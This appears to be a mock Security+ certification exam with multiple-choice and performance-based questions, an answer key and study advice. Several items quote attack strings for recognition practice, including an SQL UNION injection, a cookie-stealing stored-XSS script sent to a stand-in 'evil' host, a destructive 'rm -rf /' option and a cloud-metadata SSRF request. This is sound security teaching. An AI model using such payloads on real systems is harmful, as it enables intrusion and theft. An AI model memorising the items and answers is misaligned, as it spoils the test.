# 🧪 Final Mock Exam — CompTIA Security+ (SY0-701)

> **Conditions:** 90 minutes. 90 questions. Closed book. Treat this as the REAL exam.
> **Pass mark:** 75/90 (~83%). The real Sec+ passes at 750/900 (~83%).
> Take this 2–3 days before your booked exam. Aim for **80+ correct**.
>
> 🧪 **Performance-Based Questions:** Questions 86–90 are PBQ-style multi-part scenarios. They are worth more on the real exam. Spend extra care.

---

## 📝 Questions

### 1. The CIA in CIA triad stands for:
A. Cryptography, Identity, Authorization
B. Confidentiality, Integrity, Availability
C. Compliance, Integrity, Audit
D. Control, Identification, Access

### 2. A digital signature provides:
A. Confidentiality only
B. Availability
C. Integrity, authentication, and non-repudiation
D. Encryption of bulk data

### 3. AES is which type of cipher?
A. Symmetric block
B. Asymmetric block
C. Hashing
D. Stream key exchange

### 4. RSA is primarily used for:
A. Hashing
B. Password storage
C. Bulk encryption of large files
D. Asymmetric encryption + digital signatures + key exchange

### 5. Which provides authenticated encryption?
A. AES-ECB
B. AES-GCM
C. AES-CBC
D. RC4

### 6. ECDHE provides:
A. AES key generation
B. Perfect Forward Secrecy via ephemeral elliptic-curve DH
C. Code signing
D. Password hashing

### 7. SHA-1 should NOT be used because:
A. It's too slow
B. It's open source
C. Collisions have been demonstrated
D. It requires HSM

### 8. Plain SHA-256 is INSUFFICIENT for passwords because:
A. It's reversible
B. It's too fast — needs salt + key stretching (bcrypt/Argon2/PBKDF2)
C. It produces 128-bit output
D. It's not a hash

### 9. The certificate file format that bundles cert + private key + chain is:
A. PEM
B. DER
C. PKCS#12 (.pfx)
D. PKCS#7

### 10. OCSP stapling improves OCSP by:
A. Server pre-fetching the OCSP response and attaching it to TLS
B. Encrypting the response
C. Replacing CRL
D. Requiring mutual TLS

### 11. A wildcard cert for `*.example.com` covers:
A. example.com only
B. Multi-level subdomains too
C. Any single-label subdomain (www, api, mail)
D. All TLDs

### 12. To digitally sign, you encrypt the hash with:
A. Sender's public key
B. Recipient's private key
C. Sender's private key
D. Recipient's public key

### 13. To encrypt for confidentiality to a recipient, you use:
A. Sender's private key
B. A shared symmetric key always
C. Sender's public key
D. Recipient's public key

### 14. AAA stands for:
A. Authentication, Authorization, Accounting
B. Audit, Access, Approval
C. Allowed, Approved, Audited
D. Authentication, Auditing, Approval

### 15. The Zero Trust component that evaluates policy and risk signals to make a decision is the:
A. Policy Enforcement Point
B. Implicit Trust Zone
C. Policy Administrator
D. Policy Engine

### 16. The Zero Trust component in the data plane that allows/blocks traffic is the:
A. Policy Engine
B. Policy Enforcement Point (PEP)
C. Policy Administrator
D. Threat Scope Reduction

### 17. "Adaptive Identity" means:
A. Identity claims change at runtime
B. Authentication strength scales with risk signals
C. The IdP rotates session keys
D. Multiple identities merge

### 18. Which is a managerial control?
A. Firewall rule
B. Antivirus quarantine
C. Door lock
D. Acceptable Use Policy

### 19. A "compensating" control is:
A. An alternative when the primary control isn't feasible
B. Always weaker than the primary
C. Free of charge
D. The strongest available

### 20. A visible camera at the entrance is:
A. Preventive only
B. Compensating
C. Corrective
D. Deterrent (and detective if recorded)

### 21. Comparing current security posture to ISO 27001 requires a:
A. Penetration test
B. Risk acceptance
C. Gap analysis
D. Tabletop exercise

### 22. Before deploying a high-impact production change, the FIRST formal step is:
A. Backout plan
B. Failover
C. Public announcement
D. Impact analysis + CAB approval

### 23. The 5 Sec+ authentication factors are know, have, are, do, and:
A. See
B. Remember
C. Where you are
D. Approve

### 24. MFA means:
A. Three factors minimum
B. Password + PIN
C. ≥2 factors from DIFFERENT categories
D. Any 2 passwords

### 25. The MOST phishing-resistant MFA method is:
A. SMS code
B. Push notification with Approve/Deny
C. FIDO2 / passkey hardware
D. Knowledge-based questions

### 26. SAML uses what data format?
A. JSON tokens
B. Binary
C. XML assertions
D. JWT

### 27. OAuth 2.0 is for:
A. Authentication
B. DNS lookup
C. Authorization (delegated access)
D. Crypto key exchange

### 28. OIDC adds to OAuth 2.0:
A. Authorization
B. CRL distribution
C. Authentication via id_token (JWT)
D. ARP resolution

### 29. Kerberos requires:
A. Single domain
B. Direct internet access
C. IPv6
D. Time synchronization (~5 min skew)

### 30. RADIUS by default uses:
A. UDP 1812 / 1813
B. TCP 49
C. TCP 443
D. UDP 514

### 31. TACACS+ uses:
A. UDP 514
B. UDP 1812
C. TCP 443
D. TCP 49

### 32. A US military system enforces clearance-based access regardless of owner is:
A. DAC
B. Rule-Based
C. RBAC
D. MAC

### 33. RBAC is BEST described as:
A. Owner-discretion based
B. Attribute-based dynamic
C. Permissions per role; users get roles
D. Time-based

### 34. JIT privileged access reduces risk by:
A. Encrypting admin passwords
B. Requiring biometrics only
C. Increasing logging volume
D. Limiting time window of standing privilege

### 35. NIST 800-63B's current guidance on periodic password rotation is:
A. Do NOT force rotation absent evidence of compromise
B. Every 90 days
C. Every 30 days
D. Weekly for admins

### 36. An MFA fatigue attack:
A. Bombards a user with push prompts hoping for a misclick
B. Brute forces hashes offline
C. Steals TOTP seeds
D. Forges signed certs

### 37. An APT is BEST characterized by:
A. Loud, fast destructive activity
B. Sales-driven motivation
C. Random teen hacker
D. Long-term, low-noise persistence by a well-resourced actor

### 38. Ransomware crews are usually motivated by:
A. Espionage
B. Revenge
C. Political beliefs
D. Financial gain

### 39. Hacktivists are usually motivated by:
A. Financial gain
B. Espionage
C. Curiosity only
D. Philosophical / political beliefs

### 40. The SolarWinds incident is best described as:
A. Supply-chain attack
B. DDoS
C. Phishing
D. Pretexting

### 41. A free US government-curated threat feed is:
A. Mandiant
B. Recorded Future
C. CrowdStrike Intel
D. AIS (CISA)

### 42. ISAC stands for:
A. Information Sharing and Analysis Center (industry-specific)
B. International Security Auth Center
C. Integrated System Audit Catalog
D. Independent Security Assessment Council

### 43. MITRE ATT&CK catalogs:
A. Compliance controls
B. Encryption algorithms
C. Adversary TTPs (Tactics, Techniques, Procedures)
D. Vendor contracts

### 44. A worm vs a virus is differentiated by:
A. The worm self-replicates over networks without user action
B. The virus is faster
C. The worm always exfiltrates data
D. The virus is fileless

### 45. Modern ransomware practices "double extortion" by:
A. Charging twice
B. Compromising two orgs
C. Encrypting AND exfiltrating, threatening leak if unpaid
D. Using two algorithms

### 46. The PRIMARY defense against SQL injection is:
A. Input length limits
B. Parameterized queries / prepared statements
C. WAF as the sole control
D. Disabling SQL

### 47. Stored XSS is:
A. XSS reflected in the URL
B. JavaScript persisted on the server that runs for every viewer
C. Server-side request forgery
D. Buffer overflow

### 48. CSRF is:
A. Cross-Site Request Forgery — victim browser tricked into request
B. Cross-Server Resource Federation
C. Server-Side Request Forgery
D. Code Signing Request Format

### 49. SSRF is:
A. Client-side script attack
B. SQL UNION attack
C. Switch-Side Routing Failure
D. Server-Side Request Forgery — server fetches attacker-controlled URLs

### 50. Directory traversal uses:
A. `../../etc/passwd`
B. `<script>...</script>`
C. `' OR 1=1 --`
D. `; rm -rf /`

### 51. TOCTOU is a:
A. Type of social engineering
B. Hashing weakness
C. Compliance gap
D. Race condition

### 52. A SYN flood exhausts:
A. RAM
B. The TCP half-open connection table
C. DNS cache
D. Disk space

### 53. A DNS amplification attack relies on:
A. Compromising the resolver
B. Spoofed source IPs + DNS responses much larger than queries
C. Encrypted DNS
D. Slow query timeouts

### 54. The Sec+ term for "man-in-the-middle" is:
A. On-path attack
B. Replay attack
C. Side-channel
D. Pivot

### 55. An "evil twin" wireless attack:
A. Is a Bluetooth attack
B. Is a worm pair
C. Impersonates a legit SSID with stronger signal
D. Is a Wi-Fi DDoS

### 56. Password spraying differs from brute force because spraying:
A. Tries one password against many users (avoiding lockout)
B. Tries many passwords against one user
C. Uses rainbow tables
D. Targets HMAC

### 57. Credential stuffing uses:
A. Pre-computed rainbow tables
B. Username/password pairs from a previous breach
C. Single password across many accounts
D. Pass-the-hash

### 58. Whaling targets:
A. Anyone
B. Executives specifically
C. Random IT staff
D. Vendors

### 59. Typosquatting registers:
A. Random domains
B. International domain names only
C. Misspelled versions of legitimate domains
D. Subdomains of victim domains

### 60. SFTP runs over:
A. TLS / 990
B. SSH / 22
C. FTP / 21
D. SCP / 873

### 61. LDAPS port is:
A. 389
B. 636
C. 443
D. 1812

### 62. SPF, DKIM, DMARC prevent:
A. Email domain spoofing
B. SQL injection
C. DDoS
D. Buffer overflows

### 63. A WAF protects:
A. Layer 7 (HTTP/S)
B. Layer 3
C. Layer 2
D. Layer 4

### 64. IDS vs IPS difference:
A. IDS = detect/alert; IPS = detect/block (inline)
B. IDS = host; IPS = network
C. IDS = cloud; IPS = on-prem
D. They're the same

### 65. IPSec Tunnel mode encrypts:
A. The entire original IP packet
B. The payload only
C. Just the IP header
D. Only the TCP handshake

### 66. PPTP should be:
A. Used for new VPN deployments
B. Used over public Wi-Fi only
C. Combined with WireGuard
D. Replaced (it is broken)

### 67. EDR adds what beyond AV?
A. More signatures
B. Faster scans
C. Hardware integration only
D. Behavioral telemetry, threat hunting, rollback, response

### 68. XDR extends EDR by:
A. More endpoints
B. Replacing the firewall
C. Correlating endpoint + network + cloud + email telemetry
D. Adding encryption

### 69. In IaaS, the customer is responsible for:
A. Guest OS, app, data, network configs in the VM
B. Hypervisor security
C. Physical facility
D. Server hardware

### 70. A public S3 bucket exposing customer data is:
A. AWS's fault under shared responsibility
B. The customer's misconfig
C. An IPv6 issue
D. A KMS bug

### 71. CASB primarily:
A. Hosts websites
B. Sits between users and cloud apps; enforces policy; finds shadow IT
C. Replaces SIEM
D. Provides EDR

### 72. ZTNA replaces:
A. SAML
B. Traditional VPN for user app access
C. EDR
D. CSPM

### 73. SCADA systems typically:
A. Patch monthly
B. Are public-cloud only
C. Have long lifecycles + limited patching + proprietary protocols
D. Use Kerberos

### 74. SIEM provides primarily:
A. Patching
B. Encryption at rest
C. Firewall mgmt
D. Log aggregation + correlation + alerting

### 75. SOAR primarily:
A. Adds log storage
B. Replaces SIEM
C. Orchestrates and automates response via playbooks
D. Replaces EDR

### 76. NIST IR phase order:
A. Detect → Prep → Eradicate → Contain → Recover → Lessons
B. Prep → Detect → Contain → Eradicate → Recover → Lessons
C. Prep → Contain → Detect → Eradicate → Recover → Lessons
D. Eradicate → Detect → Prep → Contain → Recover → Lessons

### 77. Order of volatility — capture FIRST:
A. Hard disk
B. RAM (volatile memory) and running process state
C. Email logs
D. Backup tapes

### 78. SSD secure sanitization techniques include all EXCEPT:
A. Degaussing
B. Physical destruction
C. Crypto-erase
D. Vendor secure-erase command

### 79. SLE × ARO equals:
A. ALE
B. EF
C. AV
D. ROI

### 80. RTO refers to:
A. Maximum acceptable data loss
B. Maximum acceptable downtime
C. Mean time to recover (engineering metric)
D. Backup retention

### 81. The 3-2-1 backup rule means:
A. 3 backups, 2 admins, 1 vault
B. 3 copies, 2 different media, 1 off-site
C. 3 generations, 2 tools, 1 audit
D. 3 days, 2 weeks, 1 month

### 82. A HIPAA-required contract with a vendor handling PHI is:
A. BAA
B. SLA
C. MOU
D. DPA

### 83. SCA finds:
A. Custom-code injection
B. IDS alerts
C. Phishing
D. Known-vulnerable third-party dependencies

### 84. Confidential computing protects data in which state?
A. At rest
B. In use
C. In transit
D. Archived

### 85. Pseudonymization vs anonymization (GDPR):
A. Identical
B. Pseudonymization is stronger
C. Pseudonymization is reversible with mapping; GDPR still applies. Anonymization is irreversible.
D. Anonymization uses bcrypt

---

## 🧪 PBQ Section (Q86–Q90)

These are multi-part performance-based questions. Read carefully — each part adds to the score.

### 86 (PBQ — Match attacks to indicators). Match each web log indicator to its attack name:
- (i) `id=42' UNION SELECT username,password FROM users--`
- (ii) `<script>document.location='http://evil/'+document.cookie</script>` saved in a forum post
- (iii) Request from internal IP to `http://169.254.169.254/latest/meta-data/`
- (iv) `GET /docs/../../etc/passwd HTTP/1.1`
- (v) `?next=https://attacker.example.com`

A. (i) SQLi, (ii) Stored XSS, (iii) SSRF, (iv) Directory traversal, (v) Open redirect
B. (i) XSS, (ii) SQLi, (iii) Replay, (iv) Buffer overflow, (v) SSRF
C. (i) CSRF, (ii) SQLi, (iii) DDoS, (iv) Pharming, (v) Phishing
D. (i) SSRF, (ii) Reflected XSS, (iii) SQLi, (iv) Open redirect, (v) CSRF

### 87 (PBQ — IR ordering). A SOC sees a host beaconing to a known C2 and laterally moving via SMB. Order these actions per the NIST IR lifecycle (earliest to latest):
- (A) Update playbooks with new IOCs
- (B) Capture memory image of the host
- (C) Determine scope of impact (which other hosts touched)
- (D) Isolate the host via EDR network containment
- (E) Wipe and rebuild
- (F) Restore user files from clean backup
- (G) Review and conduct post-incident meeting

A. C → B → D → E → F → G → A
B. E → D → B → C → F → A → G
C. A → C → B → D → E → F → G
D. D → C → B → A → E → F → G

### 88 (PBQ — Place network appliances). You're designing the network. Match each item to its zone (Internet / DMZ / Internal / Secure Zone / Management):
- (i) Public web servers
- (ii) DB servers reachable only from the web tier on specific ports
- (iii) Corporate file servers + employee laptops
- (iv) Jump server for admin SSH/RDP
- (v) WAF in front of the web tier
- (vi) NIDS sensor

A. (i) DMZ, (ii) Secure Zone, (iii) Internal, (iv) Management, (v) DMZ ingress (between Internet and DMZ), (vi) SPAN at chokepoints
B. (i) Internal, (ii) DMZ, (iii) Secure, (iv) DMZ, (v) Secure, (vi) Internet
C. (i) Secure, (ii) DMZ, (iii) Management, (iv) Internet, (v) DMZ, (vi) Internal
D. All in DMZ

### 89 (PBQ — Risk treatment + math). The Acme Corp risk register includes:
- Asset: HR database. AV = $2,000,000. EF per ransomware event = 25%. ARO = 0.20/year.
- Asset: Public marketing website. AV = $100,000. EF per DDoS = 50%. ARO = 1.0/year.

Calculate ALE for each AND pick the BEST risk treatment per asset.

A. HR ALE = $100,000; Website ALE = $50,000. HR: mitigate (immutable backups + EDR + MFA). Website: mitigate (CDN + DDoS protection).
B. HR ALE = $400,000; Website ALE = $200,000. HR: avoid. Website: accept.
C. HR ALE = $500,000; Website ALE = $100,000. Both: transfer.
D. HR ALE = $50,000; Website ALE = $25,000. Both: accept.

### 90 (PBQ — Match contract to scenario). For each scenario, pick the most appropriate document(s):
- (i) Company hires a SaaS vendor for a 6-month POC under an ongoing master agreement
- (ii) Vendor will process EU customer personal data
- (iii) Two healthcare providers exchange Protected Health Information for treatment continuity
- (iv) Two organizations agree on aspirational cooperation, non-binding
- (v) Two interconnecting systems define connection-specific security controls

A. (i) SOW (under MSA) + SLA, (ii) DPA, (iii) BAA, (iv) MOU, (v) ISA
B. (i) MSA, (ii) BAA, (iii) DPA, (iv) NDA, (v) BPA
C. (i) NDA, (ii) MOU, (iii) SLA, (iv) MSA, (v) DPA
D. All five = MSAs

---

## 🎯 Answer Key (No Cheating!)

```
1.  B    19. A    37. D    55. C    73. C
2.  C    20. D    38. D    56. A    74. D
3.  A    21. C    39. D    57. B    75. C
4.  D    22. D    40. A    58. B    76. B
5.  B    23. C    41. D    59. C    77. B
6.  B    24. C    42. A    60. B    78. A
7.  C    25. C    43. C    61. B    79. A
8.  B    26. C    44. A    62. A    80. B
9.  C    27. C    45. C    63. A    81. B
10. A    28. C    46. B    64. A    82. A
11. C    29. D    47. B    65. A    83. D
12. C    30. A    48. A    66. D    84. B
13. D    31. D    49. D    67. D    85. C
14. A    32. D    50. A    68. C    86. A
15. D    33. C    51. D    69. A    87. A
16. B    34. D    52. B    70. B    88. A
17. B    35. A    53. B    71. B    89. A
18. D    36. A    54. A    72. B    90. A
```

### PBQ explanations
- **#86** Classic indicator-to-attack matching: SQLi (UNION), stored XSS (persisted script tag), SSRF (cloud-metadata IP), directory traversal (`../`), open redirect (`?next=`).
- **#87** Order: D&A (scope → memory) → Containment (isolate) → Eradication (wipe) → Recovery (restore) → Lessons (playbook + meeting).
- **#88** Standard layered architecture: web in DMZ, DBs in Secure, employees Internal, jump server in Management, WAF in front of DMZ, sensors at SPAN ports.
- **#89** HR: SLE = $2M × 0.25 = $500k; ALE = $500k × 0.20 = **$100k**. Website: SLE = $100k × 0.50 = $50k; ALE = $50k × 1.0 = **$50k**. Both are significant enough that *mitigation* (controls) makes sense; avoidance is extreme, acceptance is wrong, transfer (insurance) might supplement but not replace.
- **#90** SOW + SLA for project scope/performance under MSA; DPA for GDPR; BAA for HIPAA; MOU for non-binding; ISA for system interconnection.

---

## 📊 Scoring

| Score | Verdict |
|-------|---------|
| 84–90 | 🏆 Book the real exam this week — you're ready |
| 75–83 | ✅ Passing margin — fix the misses, take 1–2 more nights review, then book |
| 65–74 | ⚠️ Borderline — review weak domains for a week, retake |
| <65 | 🔁 Don't book yet — significant gaps in 2+ domains |

---

## 🔍 Final Review Process

For EVERY missed question:
1. Note the **domain** (Domain 1-5) and **module** it came from
2. Tally missed by domain — is one domain dominating? That's your weak spot
3. Re-read the relevant Reading.md sections
4. Update flashcards
5. Take Professor Messer's free Sec+ practice exam at https://www.professormesser.com/

### Common weak-domain remediation
- Weak in **Crypto (M2)** → Computerphile videos + Cloudflare's TLS posts
- Weak in **IAM (M3)** → Auth0's "Intro to IAM" series
- Weak in **Attacks (M5)** → John Hammond / IppSec walkthroughs
- Weak in **Network (M6)** → PracticalNetworking.net IPSec series
- Weak in **Ops (M8)** → MyDFIR's IR/forensics videos
- Weak in **GRC (M9)** → Sometimes pure flashcard memorization is faster than re-reading

---

## 🎯 The Day Before The Real Exam

- ❌ Do NOT take another full practice exam
- ✅ Review flashcards (especially acronyms)
- ✅ Re-read each module's Cheat-Sheet.md
- ✅ Sleep 7+ hours
- ✅ Eat protein
- ✅ Plan to arrive 30 min early
- ✅ Bring 2 forms of ID

## 🎯 During The Real Exam

- 90 questions in 90 minutes = 1 min/question average. **PBQs take 3-5x longer.**
- **Skip PBQs first** if you start there — do all MCQs, then return to PBQs with remaining time
- Flag uncertain MCQs and revisit if time allows
- Trust your first instinct on multiple-choice — don't over-think
- For PBQs, eliminate clearly wrong options first
- Always answer — there's no penalty for guessing

You've got this. 🛡️
